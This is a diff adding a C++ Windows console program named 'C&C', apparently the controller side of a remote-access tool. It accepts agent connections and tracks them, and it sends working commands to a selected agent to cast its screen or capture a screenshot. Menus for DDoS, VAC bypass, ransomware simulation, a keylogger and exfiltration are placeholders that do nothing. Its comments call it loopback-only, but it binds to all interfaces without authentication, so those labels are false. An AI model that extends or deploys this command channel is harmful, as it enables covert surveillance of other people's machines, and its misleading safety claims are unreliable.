@@ -1,0 +1,1273 @@
+
+#ifndef NOMINMAX
+#define NOMINMAX
+#endif
+
+#define WIN32_LEAN_AND_MEAN
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+#include <iostream>
+#include <string>
+#include <vector>
+#include <memory>
+#include <mutex>
+#include <thread>
+#include <atomic>
+#include <limits>
+#include <ctime>
+#include <sstream>
+#include <iomanip>
+#include <random>
+#include <cstdint>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+using namespace std;
+
+// ============================================================
+// APPLICATION CONFIGURATION
+// ============================================================
+
+const string APP_NAME = "C&C";
+const string APP_VERSION = "1.12B1D.A1";
+const string MODULE_VERSION = "0.0.0";
+const string BUILD_TYPE = "PLACEHOLDER BUILD";
+const string EXECUTION_MODE = "NO-OP";
+
+const int DEFAULT_PORT = 50028;
+const string DEFAULT_SERVER_IP = "0.0.0.0";
+const int MAX_CLIENTS = 100;
+
+// ============================================================
+// MODULE INFORMATION - ORIGINAL IDS PRESERVED
+// ============================================================
+
+struct ModuleInfo {
+    string name;
+    string id;
+    string version;
+};
+
+const ModuleInfo MODULE_VIDEO =
+{ "VIDEO", "MOD-VIDEO-001", MODULE_VERSION };
+
+const ModuleInfo MODULE_BYPASS =
+{ "BYPASS", "MOD-BYPASS-002", MODULE_VERSION };
+
+const ModuleInfo MODULE_RECON =
+{ "RECONNAISSANCE", "MOD-RECON-003", MODULE_VERSION };
+
+const ModuleInfo MODULE_PROCESS =
+{ "PROCESS MANAGER", "MOD-PROCESS-004", MODULE_VERSION };
+
+const ModuleInfo MODULE_NETWORK =
+{ "NETWORK", "MOD-NETWORK-005", MODULE_VERSION };
+
+const ModuleInfo MODULE_FILE =
+{ "FILE MANAGER", "MOD-FILE-006", MODULE_VERSION };
+
+const ModuleInfo MODULE_PERSIST =
+{ "PERSISTENCE LAB", "MOD-PERSIST-007", MODULE_VERSION };
+
+const ModuleInfo MODULE_SURVEIL =
+{ "SURVEILLANCE LAB", "MOD-SURVEIL-008", MODULE_VERSION };
+
+const ModuleInfo MODULE_SIM =
+{ "SIMULATION", "MOD-SIM-009", MODULE_VERSION };
+
+const ModuleInfo MODULE_CLIENT =
+{ "CLIENT MANAGER", "MOD-CLIENT-010", MODULE_VERSION };
+
+const ModuleInfo MODULE_SETTINGS =
+{ "SETTINGS", "MOD-SETTINGS-011", MODULE_VERSION };
+
+const ModuleInfo MODULE_VAC =
+{ "MODULE VAC", "MOD-VAC-002A", MODULE_VERSION };
+
+// ============================================================
+// CLIENT REGISTRY
+// ============================================================
+
+struct ClientInfo {
+    int id = 0;
+    string agentId;
+    string address;
+    unsigned short port = 0;
+    string connectedAt;
+    SOCKET socketHandle = INVALID_SOCKET;
+    atomic<bool> connected{ true };
+    mutex socketMutex;
+};
+
+mutex clientsMutex;
+vector<shared_ptr<ClientInfo>> clients;
+
+atomic<int> nextClientId{ 1 };
+atomic<bool> serverRunning{ true };
+
+SOCKET listenerSocket = INVALID_SOCKET;
+thread acceptThread;
+
+int selectedClientId = -1;
+
+
+shared_ptr<ClientInfo> FindClient(int id);
+void PrintSubMenu(const ModuleInfo& module, const vector<string>& options);
+void PrintSeparator();
+int GetUserInput(int minimum, int maximum);
+void WaitForEnter();
+void ClearConsole();
+
+// ============================================================
+// TCP COMMAND PROTOCOL
+// ============================================================
+
+constexpr uint32_t PROTOCOL_VERSION = 1;
+constexpr uint32_t MESSAGE_REQUEST = 1;
+constexpr uint32_t MESSAGE_RESPONSE = 2;
+constexpr uint32_t STATUS_OK = 0;
+constexpr uint32_t STATUS_ERROR = 1;
+constexpr uint32_t COMMAND_GROUP_CORE = 0;
+constexpr uint32_t COMMAND_GROUP_VIDEO = 1;
+constexpr uint32_t COMMAND_PING = 1;
+constexpr uint32_t VIDEO_START = 1;
+constexpr uint32_t VIDEO_STOP = 2;
+constexpr uint32_t VIDEO_SCREENSHOT = 3;
+
+struct MessageHeader {
+    uint32_t protocolVersion;
+    uint32_t messageType;
+    uint32_t commandId;
+    uint32_t payloadSize;
+    uint32_t status;
+    uint32_t reserved; // command group
+};
+
+static_assert(sizeof(MessageHeader) == 24,
+    "MessageHeader must be exactly 24 bytes.");
+
+bool SendAll(SOCKET s, const char* data, int length) {
+    int sent = 0;
+    while (sent < length) {
+        int n = send(s, data + sent, length - sent, 0);
+        if (n <= 0) return false;
+        sent += n;
+    }
+    return true;
+}
+
+bool ReceiveAll(SOCKET s, char* data, int length) {
+    int received = 0;
+    while (received < length) {
+        int n = recv(s, data + received, length - received, 0);
+        if (n <= 0) return false;
+        received += n;
+    }
+    return true;
+}
+
+bool SendVideoCommand(const shared_ptr<ClientInfo>& client,
+    uint32_t commandId, const string& payload, string& responseText) {
+    if (!client) return false;
+    lock_guard<mutex> socketLock(client->socketMutex);
+    if (!client->connected.load() || client->socketHandle == INVALID_SOCKET)
+        return false;
+
+    MessageHeader request{};
+    request.protocolVersion = PROTOCOL_VERSION;
+    request.messageType = MESSAGE_REQUEST;
+    request.commandId = commandId;
+    request.payloadSize = static_cast<uint32_t>(payload.size());
+    request.status = 0;
+    request.reserved = COMMAND_GROUP_VIDEO;
+
+    if (!SendAll(client->socketHandle,
+        reinterpret_cast<const char*>(&request), sizeof(request))) return false;
+    if (!payload.empty() && !SendAll(client->socketHandle,
+        payload.data(), static_cast<int>(payload.size()))) return false;
+
+    MessageHeader response{};
+    if (!ReceiveAll(client->socketHandle,
+        reinterpret_cast<char*>(&response), sizeof(response))) return false;
+    if (response.protocolVersion != PROTOCOL_VERSION ||
+        response.messageType != MESSAGE_RESPONSE ||
+        response.commandId != commandId ||
+        response.reserved != COMMAND_GROUP_VIDEO ||
+        response.payloadSize > 4096) return false;
+
+    vector<char> body(response.payloadSize);
+    if (!body.empty() && !ReceiveAll(client->socketHandle,
+        body.data(), static_cast<int>(body.size()))) return false;
+    responseText.assign(body.begin(), body.end());
+    return response.status == STATUS_OK;
+}
+
+void RunVideoMenu() {
+    const vector<string> options = {
+        "Cast screen (target)",
+        "Stop the broadcast (target)",
+        "Capture screenshot",
+        "Back"
+    };
+
+    while (serverRunning) {
+        PrintSubMenu(MODULE_VIDEO, options);
+        int choice = GetUserInput(1, 4);
+        if (choice == 4) return;
+
+        ClearConsole();
+        cout << "VIDEO\n";
+        PrintSeparator();
+        if (selectedClientId == -1) {
+            cout << "No client selected. Open Client Manager -> Select Client first.\n";
+            PrintSeparator();
+            WaitForEnter();
+            continue;
+        }
+
+        auto client = FindClient(selectedClientId);
+        if (!client || !client->connected.load()) {
+            cout << "Selected client is offline.\n";
+            selectedClientId = -1;
+            WaitForEnter();
+            continue;
+        }
+
+        cout << "Target: " << client->agentId << " (ID " << client->id << ")\n";
+        string reply;
+        uint32_t command = (choice == 1) ? VIDEO_START :
+            (choice == 2) ? VIDEO_STOP : VIDEO_SCREENSHOT;
+
+        bool ok = SendVideoCommand(client, command, "", reply);
+        if (ok) cout << "[CLIENT] " << reply << '\n';
+        else if (!reply.empty()) cout << "[CLIENT] " << reply << '\n';
+        else cout << "[ERROR] No valid response; connection may be closed.\n";
+
+        PrintSeparator();
+        WaitForEnter();
+    }
+}
+
+// ============================================================
+// CONSOLE UTILITIES
+// ============================================================
+
+void ClearConsole() {
+    system("cls");
+}
+
+void PrintSeparator() {
+    cout << "------------------------------------------\n";
+}
+
+void WaitForEnter() {
+    cout << "\nPress Enter to continue...";
+    cin.ignore((numeric_limits<streamsize>::max)(), '\n');
+    cin.get();
+}
+
+int GetUserInput(int minimum, int maximum) {
+    int value;
+
+    while (!(cin >> value) ||
+        value < minimum ||
+        value > maximum) {
+
+        cin.clear();
+        cin.ignore(
+            (numeric_limits<streamsize>::max)(),
+            '\n'
+        );
+
+        cout << "Enter a number between "
+            << minimum << " and " << maximum << ": ";
+    }
+
+    return value;
+}
+
+string GetCurrentTimestamp() {
+    time_t now = time(nullptr);
+    tm localTime{};
+
+    localtime_s(&localTime, &now);
+
+    stringstream output;
+    output << put_time(&localTime, "%Y-%m-%d %H:%M:%S");
+
+    return output.str();
+}
+
+string MakeAgentId(int id) {
+    static const char digits[] = "0123456789ABCDEF";
+
+    mt19937 generator(
+        static_cast<unsigned int>(
+            time(nullptr) ^ (id * 7919)
+            )
+    );
+
+    uniform_int_distribution<int> distribution(0, 15);
+
+    string result = "ID" + to_string(id) + " #";
+
+    for (int i = 0; i < 11; ++i) {
+        result += digits[distribution(generator)];
+    }
+
+    return result;
+}
+
+// ============================================================
+// CLIENT LOOKUP
+// ============================================================
+
+shared_ptr<ClientInfo> FindClient(int id) {
+    lock_guard<mutex> lock(clientsMutex);
+
+    for (const auto& client : clients) {
+        if (client->id == id) {
+            return client;
+        }
+    }
+
+    return nullptr;
+}
+
+int GetConnectedCount() {
+    lock_guard<mutex> lock(clientsMutex);
+
+    int count = 0;
+
+    for (const auto& client : clients) {
+        if (client->connected.load()) {
+            ++count;
+        }
+    }
+
+    return count;
+}
+
+// ============================================================
+// CONNECTION STATUS CHECK
+// ============================================================
+
+bool RefreshClientStatus(
+    const shared_ptr<ClientInfo>& client
+) {
+    if (!client) {
+        return false;
+    }
+
+    lock_guard<mutex> socketLock(client->socketMutex);
+
+    if (!client->connected.load() ||
+        client->socketHandle == INVALID_SOCKET) {
+        return false;
+    }
+
+    fd_set readSet;
+    FD_ZERO(&readSet);
+    FD_SET(client->socketHandle, &readSet);
+
+    timeval timeout{};
+    timeout.tv_sec = 0;
+    timeout.tv_usec = 0;
+
+    int result = select(
+        0,
+        &readSet,
+        nullptr,
+        nullptr,
+        &timeout
+    );
+
+    if (result == SOCKET_ERROR) {
+        closesocket(client->socketHandle);
+        client->socketHandle = INVALID_SOCKET;
+        client->connected = false;
+        return false;
+    }
+
+    if (result > 0 &&
+        FD_ISSET(client->socketHandle, &readSet)) {
+
+        char peekBuffer = 0;
+
+        int received = recv(
+            client->socketHandle,
+            &peekBuffer,
+            1,
+            MSG_PEEK
+        );
+
+        if (received == 0 || received == SOCKET_ERROR) {
+            closesocket(client->socketHandle);
+            client->socketHandle = INVALID_SOCKET;
+            client->connected = false;
+            return false;
+        }
+    }
+
+    return client->connected.load();
+}
+
+void RefreshAllClients() {
+    vector<shared_ptr<ClientInfo>> snapshot;
+
+    {
+        lock_guard<mutex> lock(clientsMutex);
+        snapshot = clients;
+    }
+
+    for (const auto& client : snapshot) {
+        RefreshClientStatus(client);
+    }
+}
+
+// ============================================================
+// CLIENT DISCONNECTION
+// ============================================================
+
+bool DisconnectClient(int id) {
+    auto client = FindClient(id);
+
+    if (!client) {
+        cout << "[ERROR] Client ID not found.\n";
+        return false;
+    }
+
+    lock_guard<mutex> socketLock(client->socketMutex);
+
+    if (!client->connected.load() ||
+        client->socketHandle == INVALID_SOCKET) {
+
+        cout << "[INFO] Client is already offline.\n";
+        return false;
+    }
+
+    shutdown(client->socketHandle, SD_BOTH);
+    closesocket(client->socketHandle);
+
+    client->socketHandle = INVALID_SOCKET;
+    client->connected = false;
+
+    cout << "[SERVER] Disconnected "
+        << client->agentId << '\n';
+
+    if (selectedClientId == id) {
+        selectedClientId = -1;
+    }
+
+    return true;
+}
+
+// ============================================================
+// CLIENT REGISTRATION
+// ============================================================
+
+void RegisterClient(
+    SOCKET socketHandle,
+    const sockaddr_in& remoteAddress
+) {
+    auto client = make_shared<ClientInfo>();
+
+    client->id = nextClientId++;
+    client->agentId = MakeAgentId(client->id);
+    client->socketHandle = socketHandle;
+    char ipBuffer[INET_ADDRSTRLEN]{};
+    inet_ntop(AF_INET, &remoteAddress.sin_addr, ipBuffer, sizeof(ipBuffer));
+    client->address = ipBuffer;
+    client->port = ntohs(remoteAddress.sin_port);
+    client->connectedAt = GetCurrentTimestamp();
+    client->connected = true;
+
+    {
+        lock_guard<mutex> lock(clientsMutex);
+
+        int onlineCount = 0;
+
+        for (const auto& existing : clients) {
+            if (existing->connected.load()) {
+                ++onlineCount;
+            }
+        }
+
+        if (onlineCount >= MAX_CLIENTS) {
+            closesocket(socketHandle);
+            cout << "[SERVER] Client limit reached.\n";
+            return;
+        }
+
+        clients.push_back(client);
+    }
+
+    cout << "\n[SERVER] New local connection\n";
+    cout << "Client ID : " << client->id << '\n';
+    cout << "Agent     : " << client->agentId << '\n';
+    cout << "Address   : " << client->address << '\n';
+    cout << "Port      : " << client->port << '\n';
+}
+
+// ============================================================
+// ACCEPT LOOP
+// ============================================================
+
+void AcceptLoop(SOCKET listeningSocket) {
+    while (serverRunning) {
+        sockaddr_in remoteAddress{};
+        int addressLength = sizeof(remoteAddress);
+
+        SOCKET newSocket = accept(
+            listeningSocket,
+            reinterpret_cast<sockaddr*>(&remoteAddress),
+            &addressLength
+        );
+
+        if (newSocket == INVALID_SOCKET) {
+            if (!serverRunning) {
+                break;
+            }
+
+            continue;
+        }
+
+        // Localhost connections only.
+
+        RegisterClient(newSocket, remoteAddress);
+    }
+}
+
+// ============================================================
+// SERVER START / STOP
+// ============================================================
+
+bool StartLocalServer() {
+    WSADATA wsaData{};
+
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        cout << "[ERROR] WSAStartup failed.\n";
+        return false;
+    }
+
+    listenerSocket = socket(
+        AF_INET,
+        SOCK_STREAM,
+        IPPROTO_TCP
+    );
+
+    if (listenerSocket == INVALID_SOCKET) {
+        cout << "[ERROR] Socket creation failed.\n";
+        WSACleanup();
+        return false;
+    }
+
+    sockaddr_in serverAddress{};
+
+    serverAddress.sin_family = AF_INET;
+    serverAddress.sin_port = htons(DEFAULT_PORT);
+
+    if (inet_pton(
+        AF_INET,
+        DEFAULT_SERVER_IP.c_str(),
+        &serverAddress.sin_addr
+    ) != 1) {
+
+        cout << "[ERROR] Invalid server address.\n";
+        closesocket(listenerSocket);
+        listenerSocket = INVALID_SOCKET;
+        WSACleanup();
+        return false;
+    }
+
+    if (bind(
+        listenerSocket,
+        reinterpret_cast<sockaddr*>(&serverAddress),
+        sizeof(serverAddress)
+    ) == SOCKET_ERROR) {
+
+        cout << "[ERROR] Bind failed. Port may be in use.\n";
+        closesocket(listenerSocket);
+        listenerSocket = INVALID_SOCKET;
+        WSACleanup();
+        return false;
+    }
+
+    if (listen(listenerSocket, SOMAXCONN) == SOCKET_ERROR) {
+        cout << "[ERROR] Listen failed.\n";
+        closesocket(listenerSocket);
+        listenerSocket = INVALID_SOCKET;
+        WSACleanup();
+        return false;
+    }
+
+    serverRunning = true;
+
+    acceptThread = thread(
+        AcceptLoop,
+        listenerSocket
+    );
+
+    cout << "[SERVER] Listening on "
+        << DEFAULT_SERVER_IP << ":"
+        << DEFAULT_PORT << '\n';
+
+    cout << "[SERVER] Multiple localhost connections enabled.\n";
+
+    return true;
+}
+
+void StopLocalServer() {
+    serverRunning = false;
+
+    if (listenerSocket != INVALID_SOCKET) {
+        shutdown(listenerSocket, SD_BOTH);
+        closesocket(listenerSocket);
+        listenerSocket = INVALID_SOCKET;
+    }
+
+    if (acceptThread.joinable()) {
+        acceptThread.join();
+    }
+
+    vector<shared_ptr<ClientInfo>> snapshot;
+
+    {
+        lock_guard<mutex> lock(clientsMutex);
+        snapshot = clients;
+    }
+
+    for (const auto& client : snapshot) {
+        lock_guard<mutex> socketLock(client->socketMutex);
+
+        if (client->socketHandle != INVALID_SOCKET) {
+            shutdown(client->socketHandle, SD_BOTH);
+            closesocket(client->socketHandle);
+
+            client->socketHandle = INVALID_SOCKET;
+        }
+
+        client->connected = false;
+    }
+
+    WSACleanup();
+
+    cout << "[SERVER] All local connections closed.\n";
+}
+
+// ============================================================
+// MODULE MENU DISPLAY
+// ============================================================
+
+void PrintSubMenu(
+    const ModuleInfo& module,
+    const vector<string>& options
+) {
+    ClearConsole();
+
+    cout << module.name << '\n';
+    PrintSeparator();
+
+    cout << "Module ID      : " << module.id << '\n';
+    cout << "Module Version : " << module.version << '\n';
+
+    cout << '\n';
+
+    for (size_t i = 0; i < options.size(); ++i) {
+        cout << "[" << i + 1 << "] "
+            << options[i] << '\n';
+    }
+
+    PrintSeparator();
+    cout << "Select option: ";
+}
+
+// ============================================================
+// SAFE NO-OP MODULE ACTION
+// ============================================================
+
+void ShowNoOpAction(
+    const ModuleInfo& module,
+    const string& action
+) {
+    ClearConsole();
+
+    cout << module.name << '\n';
+    PrintSeparator();
+
+    cout << "Module ID      : " << module.id << '\n';
+    cout << "Module Version : " << module.version << '\n';
+
+    PrintSeparator();
+
+    cout << "Selected option: " << action << '\n';
+
+    PrintSeparator();
+
+    cout << "NO-OP demonstration.\n";
+    cout << "No remote system actions are available.\n";
+
+    PrintSeparator();
+    WaitForEnter();
+}
+
+// ============================================================
+// GENERIC MODULE SUBMENUS
+// ============================================================
+
+void RunSubMenu(
+    const ModuleInfo& module,
+    const vector<string>& options
+) {
+    while (serverRunning) {
+        PrintSubMenu(module, options);
+
+        int choice = GetUserInput(
+            1,
+            static_cast<int>(options.size())
+        );
+
+        // Last option is Back.
+        if (choice == static_cast<int>(options.size())) {
+            return;
+        }
+
+        ShowNoOpAction(
+            module,
+            options[choice - 1]
+        );
+    }
+}
+
+// ============================================================
+// VAC SUBMENU
+// ============================================================
+
+void ShowVACMenu() {
+    const vector<string> options = {
+        "VAC Module (are you sure?)",
+        "Back"
+    };
+
+    while (serverRunning) {
+        PrintSubMenu(MODULE_VAC, options);
+
+        int choice = GetUserInput(1, 2);
+
+        if (choice == 2) {
+            return;
+        }
+
+        ShowNoOpAction(
+            MODULE_VAC,
+            options[0]
+        );
+    }
+}
+
+// ============================================================
+// BYPASS SUBMENU
+// ============================================================
+
+void ShowBypassMenu() {
+    const vector<string> options = {
+        "Module DDoS (isolated simulation)",
+        "Module VAC",
+        "Back"
+    };
+
+    while (serverRunning) {
+        PrintSubMenu(MODULE_BYPASS, options);
+
+        int choice = GetUserInput(1, 3);
+
+        switch (choice) {
+        case 1:
+            ShowNoOpAction(
+                MODULE_BYPASS,
+                options[0]
+            );
+            break;
+
+        case 2:
+            ShowVACMenu();
+            break;
+
+        case 3:
+            return;
+        }
+    }
+}
+
+// ============================================================
+// CLIENT MANAGER
+// ============================================================
+
+void ShowClientList() {
+    RefreshAllClients();
+    ClearConsole();
+
+    cout << "CONNECTED CLIENTS\n";
+    PrintSeparator();
+
+    vector<shared_ptr<ClientInfo>> snapshot;
+
+    {
+        lock_guard<mutex> lock(clientsMutex);
+        snapshot = clients;
+    }
+
+    if (snapshot.empty()) {
+        cout << "No clients have connected yet.\n";
+    }
+
+    for (const auto& client : snapshot) {
+        cout << "Client ID : " << client->id << '\n';
+        cout << "Agent     : " << client->agentId << '\n';
+        cout << "Address   : " << client->address << '\n';
+        cout << "Port      : " << client->port << '\n';
+        cout << "Connected : " << client->connectedAt << '\n';
+
+        cout << "Status    : "
+            << (client->connected.load()
+                ? "[ONLINE]" : "[OFFLINE]")
+            << '\n';
+
+        PrintSeparator();
+    }
+
+    WaitForEnter();
+}
+
+void SelectClient() {
+    RefreshAllClients();
+    ClearConsole();
+
+    cout << "SELECT CLIENT\n";
+    PrintSeparator();
+
+    vector<shared_ptr<ClientInfo>> onlineClients;
+
+    {
+        lock_guard<mutex> lock(clientsMutex);
+
+        for (const auto& client : clients) {
+            if (client->connected.load()) {
+                onlineClients.push_back(client);
+            }
+        }
+    }
+
+    if (onlineClients.empty()) {
+        cout << "No online clients available.\n";
+        WaitForEnter();
+        return;
+    }
+
+    for (size_t i = 0; i < onlineClients.size(); ++i) {
+        cout << "[" << i + 1 << "] "
+            << onlineClients[i]->agentId
+            << " [ONLINE]\n";
+    }
+
+    cout << "[" << onlineClients.size() + 1
+        << "] Back\n";
+
+    PrintSeparator();
+    cout << "Select client: ";
+
+    int choice = GetUserInput(
+        1,
+        static_cast<int>(onlineClients.size() + 1)
+    );
+
+    if (choice == static_cast<int>(onlineClients.size() + 1)) {
+        return;
+    }
+
+    auto selected = onlineClients[choice - 1];
+
+    if (!selected->connected.load()) {
+        cout << "[ERROR] Client went offline.\n";
+        WaitForEnter();
+        return;
+    }
+
+    selectedClientId = selected->id;
+
+    cout << "\nSelected: "
+        << selected->agentId << '\n';
+
+    WaitForEnter();
+}
+
+void ShowClientInfo() {
+    RefreshAllClients();
+    ClearConsole();
+
+    cout << "CLIENT INFORMATION\n";
+    PrintSeparator();
+
+    if (selectedClientId == -1) {
+        cout << "No client selected.\n";
+        WaitForEnter();
+        return;
+    }
+
+    auto client = FindClient(selectedClientId);
+
+    if (!client) {
+        cout << "Client not found.\n";
+        selectedClientId = -1;
+        WaitForEnter();
+        return;
+    }
+
+    cout << "Client ID : " << client->id << '\n';
+    cout << "Agent     : " << client->agentId << '\n';
+    cout << "Address   : " << client->address << '\n';
+    cout << "Port      : " << client->port << '\n';
+    cout << "Connected : " << client->connectedAt << '\n';
+
+    cout << "Status    : "
+        << (client->connected.load()
+            ? "ONLINE" : "OFFLINE")
+        << '\n';
+
+    PrintSeparator();
+    WaitForEnter();
+}
+
+void DisconnectSelectedClient() {
+    ClearConsole();
+
+    cout << "DISCONNECT CLIENT\n";
+    PrintSeparator();
+
+    if (selectedClientId == -1) {
+        cout << "No client selected.\n";
+        WaitForEnter();
+        return;
+    }
+
+    cout << "Disconnect selected client #"
+        << selectedClientId
+        << "? (1 = Yes, 2 = No): ";
+
+    int choice = GetUserInput(1, 2);
+
+    if (choice == 1) {
+        DisconnectClient(selectedClientId);
+    }
+
+    WaitForEnter();
+}
+
+void ShowClientManager() {
+    const vector<string> options = {
+        "Connected Clients",
+        "Select Client",
+        "Client Information",
+        "Disconnect Selected Client",
+        "Back"
+    };
+
+    while (serverRunning) {
+        RefreshAllClients();
+
+        PrintSubMenu(MODULE_CLIENT, options);
+
+        int choice = GetUserInput(1, 5);
+
+        switch (choice) {
+        case 1:
+            ShowClientList();
+            break;
+
+        case 2:
+            SelectClient();
+            break;
+
+        case 3:
+            ShowClientInfo();
+            break;
+
+        case 4:
+            DisconnectSelectedClient();
+            break;
+
+        case 5:
+            return;
+        }
+    }
+}
+
+// ============================================================
+// SETTINGS SUBMENU
+// ============================================================
+
+void ShowSettings() {
+    const vector<string> options = {
+        "Server IP",
+        "Server Port",
+        "Authentication",
+        "TLS Configuration",
+        "Back"
+    };
+
+    while (serverRunning) {
+        PrintSubMenu(MODULE_SETTINGS, options);
+
+        int choice = GetUserInput(1, 5);
+
+        if (choice == 5) {
+            return;
+        }
+
+        ClearConsole();
+
+        cout << "SETTINGS INFORMATION\n";
+        PrintSeparator();
+
+        switch (choice) {
+        case 1:
+            cout << "Server IP: "
+                << DEFAULT_SERVER_IP << '\n';
+            cout << "Loopback address only.\n";
+            break;
+
+        case 2:
+            cout << "Default Port: "
+                << DEFAULT_PORT << '\n';
+            cout << "TCP localhost demonstration.\n";
+            break;
+
+        case 3:
+            cout << "Authentication: NOT CONFIGURED\n";
+            break;
+
+        case 4:
+            cout << "TLS Configuration: NOT CONFIGURED\n";
+            break;
+        }
+
+        PrintSeparator();
+        WaitForEnter();
+    }
+}
+
+// ============================================================
+// MAIN MENU
+// ============================================================
+
+void PrintMenu() {
+    RefreshAllClients();
+
+    ClearConsole();
+
+    PrintSeparator();
+    cout << "       " << APP_NAME << '\n';
+    PrintSeparator();
+
+    cout << "Application Version : " << APP_VERSION << '\n';
+
+    cout << "Agent               : ";
+
+    if (selectedClientId != -1) {
+        auto selected = FindClient(selectedClientId);
+
+        if (selected && selected->connected.load()) {
+            cout << selected->agentId << '\n';
+        }
+        else {
+            cout << "NONE\n";
+            selectedClientId = -1;
+        }
+    }
+    else {
+        cout << "NONE\n";
+    }
+
+    cout << "Agent Status        : ";
+
+    if (selectedClientId != -1) {
+        auto selected = FindClient(selectedClientId);
+
+        cout << (
+            selected && selected->connected.load()
+            ? "ONLINE" : "OFFLINE"
+            ) << '\n';
+    }
+    else {
+        cout << "OFFLINE\n";
+    }
+
+    cout << "Connected Clients   : "
+        << GetConnectedCount() << '\n';
+
+    cout << "Build Type          : " << BUILD_TYPE << '\n';
+    cout << "Execution Mode      : " << EXECUTION_MODE << '\n';
+    cout << "Protocol            : TCP (localhost)\n";
+
+    PrintSeparator();
+
+    cout << "\n[1]  Video\n";
+    cout << "[2]  Bypass\n";
+    cout << "[3]  Reconnaissance\n";
+    cout << "[4]  Process Manager\n";
+    cout << "[5]  Network\n";
+    cout << "[6]  File Manager\n";
+    cout << "[7]  Persistence Lab\n";
+    cout << "[8]  Surveillance Lab\n";
+    cout << "[9]  Simulation\n";
+    cout << "[10] Client Manager\n";
+    cout << "[11] Settings\n";
+    cout << "[12] Exit\n\n";
+
+    PrintSeparator();
+    cout << "Select option: ";
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+
+int main() {
+    cout << "[INFO] Starting localhost TCP connection manager.\n";
+    cout << "[INFO] Application version: "
+        << APP_VERSION << '\n';
+
+    cout << "[INFO] Execution mode: "
+        << EXECUTION_MODE << '\n';
+
+    if (!StartLocalServer()) {
+        cout << "[ERROR] Server initialization failed.\n";
+        system("pause");
+        return 1;
+    }
+
+    while (serverRunning) {
+        PrintMenu();
+
+        int choice = GetUserInput(1, 12);
+
+        switch (choice) {
+
+        case 1:
+            RunVideoMenu();
+            break;
+
+        case 2:
+            ShowBypassMenu();
+            break;
+
+        case 3:
+            RunSubMenu(
+                MODULE_RECON,
+                {
+                    "System Information",
+                    "Hardware Information",
+                    "Process Enumeration",
+                    "Network Discovery",
+                    "Back"
+                }
+            );
+            break;
+
+        case 4:
+            RunSubMenu(
+                MODULE_PROCESS,
+                {
+                    "List Processes",
+                    "Process Details",
+                    "CPU / RAM Usage",
+                    "DLL Enumeration",
+                    "Back"
+                }
+            );
+            break;
+
+        case 5:
+            RunSubMenu(
+                MODULE_NETWORK,
+                {
+                    "Active Connections",
+                    "TCP Monitor",
+                    "Traffic Analyzer",
+                    "Packet Capture Lab",
+                    "Back"
+                }
+            );
+            break;
+
+        case 6:
+            RunSubMenu(
+                MODULE_FILE,
+                {
+                    "Browse Directories",
+                    "File Information",
+                    "File Hash Generator",
+                    "File Integrity Checker",
+                    "Back"
+                }
+            );
+            break;
+
+        case 7:
+            RunSubMenu(
+                MODULE_PERSIST,
+                {
+                    "Startup Entries Audit",
+                    "Registry Run Keys Audit",
+                    "Scheduled Tasks Audit",
+                    "Windows Services Audit",
+                    "Back"
+                }
+            );
+            break;
+
+        case 8:
+            RunSubMenu(
+                MODULE_SURVEIL,
+                {
+                    "Activity Monitoring (consent)",
+                    "Event Logger",
+                    "Screen Monitoring Demo",
+                    "Back"
+                }
+            );
+            break;
+
+        case 9:
+            RunSubMenu(
+                MODULE_SIM,
+                {
+                    "Ransomware Behavior Simulator",
+                    "Fake Infection Screen",
+                    "Mock Keylogger",
+                    "Mock Data Exfiltration",
+                    "Back"
+                }
+            );
+            break;
+
+        case 10:
+            ShowClientManager();
+            break;
+
+        case 11:
+            ShowSettings();
+            break;
+
+        case 12:
+            serverRunning = false;
+            break;
+        }
+    }
+
+    StopLocalServer();
+
+    cout << "[INFO] Shutdown complete.\n";
+    return 0;
+}
